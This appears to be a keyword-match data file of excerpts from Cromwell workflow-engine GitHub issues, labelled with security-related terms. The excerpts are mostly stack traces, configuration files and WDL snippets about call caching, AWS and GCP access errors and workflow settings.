<<<; 	python3 << CODE; 	files = [""~{sep='"",""' files_to_echo}""]; 	for file in files:; 		print(file); 	CODE; 	>>>. 	runtime {; 		docker: ""ashedpotatoes/sranwrp:1.1.0""; 		memory: ""4 GB""; 	}; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6964:4064,PASSWORD,PASSWORDS,4064,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6964,1,['PASSWORD'],['PASSWORDS']
Security,ption(AbstractFuture.java:808); 	at io.grpc.stub.ClientCalls$GrpcFuture.setException(ClientCalls.java:574); 	at io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:544); 	at io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39); 	at io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23); 	at io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40); 	at com.google.api.gax.grpc.ChannelPool$ReleasingClientCall$1.onClose(ChannelPool.java:541); 	at io.grpc.internal.DelayedClientCall$DelayedListener$3.run(DelayedClientCall.java:489); 	at io.grpc.internal.DelayedClientCall$DelayedListener.delayOrExecute(DelayedClientCall.java:453); 	at io.grpc.internal.DelayedClientCall$DelayedListener.onClose(DelayedClientCall.java:486); 	at io.grpc.internal.ClientCallImpl.closeObserver(ClientCallImpl.java:576); 	at io.grpc.internal.ClientCallImpl.access$300(ClientCallImpl.java:70); 	at io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInternal(ClientCallImpl.java:757); 	at io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInContext(ClientCallImpl.java:736); 	at io.grpc.internal.ContextRunnable.run(ContextRunnable.java:37); 	at io.grpc.internal.SerializingExecutor.run(SerializingExecutor.java:133); 	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128); 	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628); 	at java.base/java.lang.Thread.run(Thread.java:829); 	Suppressed: com.google.api.gax.rpc.AsyncTaskException: Asynchronous task failed; 		at com.google.api.gax.rpc.ApiExceptions.callAndTranslateApiException(ApiExceptions.java:57); 		at com.google.api.gax.rpc.UnaryCallable.call(UnaryCallable.java:112); 		at cromwell.backend.google.batch.api.GcpBatchApiRequestHandler.$anonfun$submit$1(GcpBatchApiRequestHandler.scala:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500:2491,access,access,2491,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500,1,['access'],['access']
Security,put Validate and Inputs methods to Cromwell REST API,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2918:4,Validat,Validate,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2918,1,['Validat'],['Validate']
Security,"q) pipeline and it turns out any `path` or `path+modtime` strategies do not work with containers. As is reported in these issues: #5405, #5370, #5346 . @cmarkello, @illusional, I am sorry that I insisted that `path+modtime` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/has",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1185,hash,hash,1185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hash']
Security,"quest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:555); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:475); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:592); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:305); 	... 22 common frames omitted; [2020-07-27 18:34:01,11] [info] WorkflowManagerActor Workflow 3d2d7a27-7c37-42c7-8c96-de7efef896e3 failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:227); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:308); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:213); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:210); 	at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105); 	at com.google.cloud.RetryHelper.run(RetryHelper.java:76); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50); 	at com.google.cloud.storage.StorageImpl.internalCreate(StorageImpl.java:209); 	at com.google.cloud.storage.StorageImpl.create(StorageImpl.java:171); 	at cromwell.filesystems.gcs.GcsPath.request$1(GcsPathBuilder.scala:196); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2$adapted(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:5052,access,access,5052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,"question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Call caching fails for me with Server version: 10.3.34-MariaDB MariaDB Server and Cromwell 84. . > [2022-10-06 15:14:54,54] [info] BT-322 12ceda02:test.task_A:-1:1 is eligible for call caching with read = true and write = true; [2022-10-06 15:14:54,68] [ESC[38;5;1merrorESC[0m] $aFailed to properly process data; > java.sql.SQLSyntaxErrorException: Every derived table must have its own alias; ...; > [2022-10-06 15:14:54,68] [ESC[38;5;1merrorESC[0m] ejha_for_12ceda02-4906-4840-80a2-514af3ccb801:BackendJobDescriptorKey_CommandCallNode_test.task_A:-1:1 [ESC[38;5;2m12ceda02ESC[0mtest.task_A:NA:1]: Received unexpected event HashError(java.sql.SQLSyntaxErrorException: Every derived table must have its own alias); [2022-10-06 15:14:54,70] [info] BT-322 12ceda02:test.task_A:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; [2022-10-06 15:14:54,70] [info] 12ceda02-4906-4840-80a2-514af3ccb801-EngineJobExecutionActor-test.task_A:NA:1 [ESC[38;5;2m12ceda02ESC[0m]: Could not copy a suitable cache hit for 12ceda02:test.task_A:-1:1. No copy attempts were made. Based on [StackOverflow, the issue seems to be simply that subqueries must be aliased.](https://stackoverflow.com/q/1888779/4107809) Is MariaDB not supported? . The workflow runs jobs that complete as normal. When rerunning, no call caching results are used, and all jobs simply run again. . Cromwell connects to the call caching database and successfully creates tables, for example `CALL_CACHING_AGGREGATION_ENTRY`. . <!-- Which backend are you running? -->; I am running with a SLURM backend. . <!-- Paste/Attach your workflow if p",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:1096,Hash,HashError,1096,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,1,['Hash'],['HashError']
Security,"r {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. system {; // If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false. // Max number of retries per job that the engine will attempt in case of a retryable failure received from the backend; max-retries = 10. // If 'true' then when Cromwell starts up, it tries to restart incomplete workflows; workflow-restart = true. // Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000. // Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 50. // Number of seconds between workflow launches; new-workflow-poll-rate = 20. // Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; number-of-workflow-log-copy-workers = 10; }. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". // Directory where to write per workflow logs; workflow-log-dir: ""cromwell-workflow-logs"". // When true, per workflow logs will be deleted after copying; workflow-log-temporary: true. // Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; // Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; //workflow-failure-mode: ""ContinueWhilePossible""; }. // Optional call-caching configuration.; call-caching {; enabled = true. // The Docker image specified in the 'runtime' section of a task can be used as-is; // or Cromwell can lookup this Docker image to get a complete hash. For example,; // if a task specifies docker: ""ubuntu:latest"" and if lookup-docker-hash is true,; // Then Cromwell ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:85366,encrypt,encrypted,85366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,['encrypt'],"['encrypted', 'encrypted-fields']"
Security,"r(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.se",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7541,secur,security,7541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"r.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. I'm basically using the standard aws configuration file for Cromwell:. ```hocon; include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""ap-southeast-2""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://$bucketName/cromwell-execution""; auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes {; queueArn = ""arn:aws:batch:ap-southeast-2:$arn""; }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; ```. I've contacted AWS Support, to find out if I could fully (region) qualify the S3 locator (something like [these examples](https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html#access-bucket-intro): `s3://us-east-1.amazonaws.com/broad-references/.../file`. . AWS basically said no, and they directed me towards https://github.com/aws/aws-sdk-java/issues/1366 (their aws-sdk-java) with an [`enableForceGlobalBucketAccess`](https://docs.aws.amazon.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/AmazonS3Builder.html#enableForceGlobalBucketAccess--) option on a `AmazonS3Builder`. . I've tried to have a search through Cromwell to work out where this setting could be placed, but I'm a bit lost with project structure and Scala.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731:4428,access,access-bucket-intro,4428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731,1,['access'],['access-bucket-intro']
Security,r.default-dispatcher-15 ERROR - WorkflowActor [UUID(88b21d2d)]: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log.; java.util.NoSuchElementException: None.get; at scala.None$.get(Option.scala:347) ~[cromwell.jar:0.19]; at scala.None$.get(Option.scala:345) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$map$2.apply(TraversableLike.scala:728) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:727) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:153) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:233) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engi,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:1147,Hash,HashMap,1147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"rElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.aroundReceive(AwsBatchAsyncBackendJobExecutionActor.scala:74); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: write_lines(array_of_files): [Attempted 1 time(s)] - FileSystemException: /tmp/temp-s3-6826696772619511254cromwell-execution_best_practise_3bf9c436-31f7-4d86-ba87-cf54248e05; bc_call-ConvertPairedFastQsToUnmappedBamWf_unmap.ConvertPairedFastQsToUnmappedBamWf_e10704e8-7ff4-4e4c-89ad-48270734ba25_call-CreateFoFN_write_lines_238fd975f9e3d166dbec07b20ad88c51.tmp: File name too lon; g; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:68); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:64); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:563); ... 31 common frames omitted; ```. It seems that each ""segment"" of this filename, e.g. `bc_call-ConvertPairedFastQsToUnmappedBamWf_unmap.ConvertPairedFastQsToUnmappedBamWf_e10704e8-7ff4-4e4c-89ad-48270734ba25`, should probably be in a different folder, not just as a different segment of the same filename.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4279:4444,validat,validation,4444,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4279,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,rOneStrategy - Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk SIZE TYPE' or '/mount/point SIZE TYPE' but got: '10 HDD'; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk SIZE TYPE' or '/mount/point SIZE TYPE' but got: '10 HDD'; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.standard.StandardAsy,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4918:1290,validat,validatedRuntimeAttributes,1290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4918,1,['validat'],['validatedRuntimeAttributes']
Security,"rUtils.createExecutionContext(AwsClientHandlerUtils.java:70); cromwell_1 | 	at software.amazon.awssdk.awscore.client.handler.AwsSyncClientHandler.createExecutionContext(AwsSyncClientHandler.java:68); cromwell_1 | 	at software.amazon.awssdk.core.client.handler.BaseSyncClientHandler.execute(BaseSyncClientHandler.java:68); cromwell_1 | 	at software.amazon.awssdk.core.client.handler.SdkSyncClientHandler.execute(SdkSyncClientHandler.java:44); cromwell_1 | 	at software.amazon.awssdk.awscore.client.handler.AwsSyncClientHandler.execute(AwsSyncClientHandler.java:55); cromwell_1 | 	at software.amazon.awssdk.services.sts.DefaultStsClient.getCallerIdentity(DefaultStsClient.java:673); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:86); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:76); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:91); cromwell_1 | 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); cromwell_1 | 	at scala.util.Try$.apply(Try.scala:213); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:91); cromwell_1 | 	... 46 more; cromwell_1 | ; cromwell_1 | 2020-03-15 16:09:58,022 cromwell-system-akka.dispatchers.engine-dispatcher-59 INFO - WorkflowManagerActor WorkflowActor-c4ee3308-f9bf-41d2-acdb-70c02b6cc4b3 is in a terminal state: WorkflowFailedState`. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categori",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:4340,validat,validateCredential,4340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['validat'],['validateCredential']
Security,"raining.metadata; ```. full_dl_ob_training.wdl:; ```; import ""dl_ob_training.wdl"" as dl_ob_training. workflow full_dl_ob_training {. ....snip.... scatter (p in variant_files_pair) {; call dl_ob_training.dl_ob_training {; input:; ....snip....; }; }; }. ```. dl_ob_training.wdl:; ```; workflow dl_ob_training {. ....snip.... call CollectSequencingArtifactMetrics {; input:; .....snip.....; }. call CreateObIntervalList {; input:; .....snip.....; }. call ExtractReadInfo {; input:; ....snip.....; }. output {; ExtractReadInfo.read_infos; }; }. task CollectSequencingArtifactMetrics {; ....snip....; output {; File pre_adapter_detail_metrics = ""${output_location_prepend}.pre_adapter_detail_metrics""; File pre_adapter_summary_metrics = ""${output_location_prepend}.pre_adapter_summary_metrics""; File bait_bias_detail_metrics = ""${output_location_prepend}.bait_bias_detail_metrics""; File bait_bias_summary_metrics = ""${output_location_prepend}.bait_bias_summary_metrics""; }; }. # Build an interval list from oncotated M1; task CreateObIntervalList {. ....snip.... output {; File interval_list = ""${entity_id}_variant_intervals.list""; }; }. task ExtractReadInfo {. ....snip.... output {; Array[File] read_infos = glob(""out/*""); }; }. ```. sge_application.conf:; ```; ...snip...; workflow-options {; # These workflow options will be encrypted when stored in the database; encrypted-fields: []. # AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". # Directory where to write per workflow logs; workflow-log-dir: ""cromwell-workflow-logs"". # When true, per workflow logs will be deleted after copying; workflow-log-temporary: true. # Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; # Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; workflow-failure-mode: ""ContinueWhilePossible""; }. ....snip.... ; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1895:2442,encrypt,encrypted,2442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1895,5,['encrypt'],"['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key']"
Security,"ral scatter-gather blocks. We switched to a separate metadata database to address the Java heap problem that occurs with the in-memory database. We enabled debug logging to try and troubleshoot an unrelated problem. Most of the log output at the increased level is appears to be from HSQL. After running for about 8 hrs, the following error appears in the output and Cromwell hangs:; ```; Exception in thread ""Exec Stream Pumper"" java.lang.OutOfMemoryError: Required array length 2147483639 + 39 is too large; 	at java.base/jdk.internal.util.ArraysSupport.hugeLength(ArraysSupport.java:649); 	at java.base/jdk.internal.util.ArraysSupport.newLength(ArraysSupport.java:642); 	at java.base/java.io.ByteArrayOutputStream.ensureCapacity(ByteArrayOutputStream.java:100); 	at java.base/java.io.ByteArrayOutputStream.write(ByteArrayOutputStream.java:132); 	at org.apache.commons.io.output.ProxyOutputStream.write(ProxyOutputStream.java:92); 	at org.apache.commons.io.output.TeeOutputStream.write(TeeOutputStream.java:68); 	at org.apache.commons.exec.StreamPumper.run(StreamPumper.java:108); 	at java.base/java.lang.Thread.run(Thread.java:1623); ```. We are running Cromwell using Dockstore as a wrapper using the following command:; ```; dockstore workflow launch --local-entry BiobankScrubWorkflow.wdl --json inputs.json > dockstore.log 2>&1 &; ```. At the time the OOME occurs, the size of the dockstore.log file is approx 2147485425 bytes. Based on the ""Saving copy of Cromwell stdout to..."" messages at the end of a successful Cromwell run, it would appear that Cromwell is internally buffering the stdout and stderr streams to save at the end of the run. So when the size of the stdout or stderr exceeds the Java buffer max size, the OOME occurs. The Cromwell configuration we are using is the default with the exception of uncommenting the `database -> metadata` block and updating the docker run command to mount the local GCloud SDK configuration into the container to enable access to GCP resources.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7217:2246,access,access,2246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7217,1,['access'],['access']
Security,"rcion defined from '1' of type 'eu.timepit.refined.api.Refined' to 'Int'.; at wom.types.WomType.coerceRawValue(WomType.scala:36); at wom.types.WomType.coerceRawValue$(WomType.scala:27); at wom.types.WomIntegerType$.coerceRawValue(WomIntegerType.scala:9); at cromwell.backend.impl.sfs.config.DeclarationValidation.$anonfun$extractWdlValueOption$1(DeclarationValidation.scala:113); at scala.Option.map(Option.scala:146); at cromwell.backend.impl.sfs.config.DeclarationValidation.extractWdlValueOption(DeclarationValidation.scala:113); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.$anonfun$runtimeAttributeInputs$1(ConfigAsyncJobExecutionActor.scala:163). <!-- Which backend are you running? -->; I use the SGE backend ; <!-- Paste/Attach your workflow if possible: -->; this is my WDL workflow; """"""; workflow testsge{; String Outdir; String JobName=""filter""; call filter{input:outdir=Outdir,jobname=JobName}; }. task filter{; String outdir; String jobname; command<<<; echo ""test successful"" >>${outdir}/log.stdout; echo 1; perl -we '{print STDERR 2;}'; Script=""${jobname}""; Sleep=$SGE_TASK_ID; QsubRcControl=3; QsubType=1; 